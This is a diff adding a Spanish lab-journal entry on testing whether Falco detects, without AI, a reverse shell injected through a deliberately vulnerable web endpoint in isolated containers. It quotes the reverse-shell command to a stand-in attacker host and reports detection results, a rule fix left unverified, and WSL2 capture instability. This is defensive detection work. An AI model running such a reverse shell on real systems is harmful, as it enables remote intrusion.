@@ -66,3 +66,44 @@ hostil y se vuelve a medir.
 corpus escrito por quien conoce las respuestas mide menos de lo que parece; el corpus
 que cuenta es el que sale de incidentes reales y el que escriba un modelo distinto
 intentando colar cosas.
+
+## 2026-07-31 · Laboratorio T0/T1: ¿Falco detecta el escenario SIN IA? — SÍ (una vez), con reservas de entorno
+
+**Montaje.** [lab/](../lab/): tres contenedores en red aislada — servidor web
+vulnerable a propósito (inyección de comandos en `/ping`), atacante (curl + netcat),
+y Falco 0.39.2→0.41.3 con ruleset base + una regla local. El ataque: shell inversa
+`bash -i >& /dev/tcp/atacante/4444` inyectada vía la vuln.
+
+**Resultado — lo que SÍ quedó demostrado.**
+1. **El ataque es reproducible.** La shell inversa se establece de forma fiable en
+   cada disparo (`root@lab-objetivo:/app#` capturado como botín). El incidente que el
+   pipeline necesita repetir a voluntad, existe.
+2. **Falco detecta el escenario con su RULESET BASE, sin IA.** Regla base *"Redirect
+   stdout/stdin to network connection"*, prioridad Notice, con la línea completa:
+   `command=bash -c bash -i >& /dev/tcp/atacante/4444 0>&1 ... container=lab-objetivo`.
+   Esta es la tesis central del MVP en la práctica: la contención vive en T0/T1
+   (regla 1). Si solo lo detectara un LLM, sería teatro — y no lo es.
+
+**Hallazgo de diseño: `proc.pname` vs `proc.aname`.** Mi regla local escrita a mano NO
+disparó, y el output de Falco explicó por qué: la cadena real es
+`python → sh → bash -c → bash -i`, así que el padre *directo* del shell es `bash`, no
+`python`. La regla miraba `proc.pname` (padre directo) cuando debía mirar la cadena de
+ancestros `proc.aname[1..4]`. Corregida en
+[lab/falco/reglas_locales.yaml](../lab/falco/reglas_locales.yaml). **Esto es exactamente
+lo que el gate de replay malicioso (regla 6) atrapa: una regla que no dispara contra el
+repro → REJECT.** Una regla plausible sobre el papel que no cubre el incidente real.
+
+**Negativo de entorno: la captura de Falco en WSL2 es inestable.** Reservas serias:
+- Falco 0.39.2 **no arranca** con el kernel 6.18 de WSL2 (`scap_init` falla en
+  `modern_ebpf`); 0.41.3 sí. El driver tiene que ir por delante del kernel.
+- Aun con 0.41.3, la captura funcionó **una sola vez**: el primer arranque fresco tras
+  descargar la imagen. Tras `restart`/`recreate`/`down+up` posteriores, Falco arranca
+  y valida las reglas pero **deja de emitir eventos** (0 alertas, incluida la base que
+  antes sí saltó). No es determinista y no lo he sabido estabilizar.
+
+**Consecuencia.** La corrección `aname` queda **escrita y razonada pero NO verificada en
+ejecución** — no la he podido observar disparando porque la captura se cayó antes. No se
+marca como validada. Y la conclusión operativa, que ya anticipaba
+[lab/README.md](../lab/README.md): **para trabajo sostenido el laboratorio se mueve a una
+VM Linux con kernel estable**; Docker Desktop sobre WSL2 sirvió para probar el escenario
+una vez, no como banco de pruebas fiable. Se registra como negativo, no se maquilla.
